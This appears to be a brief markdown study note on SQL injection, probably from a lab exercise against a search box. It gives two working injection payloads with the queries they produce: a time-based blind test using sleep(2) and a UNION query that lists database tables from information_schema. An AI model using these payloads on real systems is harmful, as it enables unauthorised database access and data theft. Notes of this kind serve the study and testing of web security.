# SqlInjection
* //Input to textbox ' And 1 = sleep(2);-- 
```
Select ? from ? where ? Like '%hammer' And 1 = sleep(2);-- %'
```
* //Input to textbox 'Union ( select TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--
```
Select ?,?,? from ? where ? Like '%hammer' Union ( select TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);-- %'
```
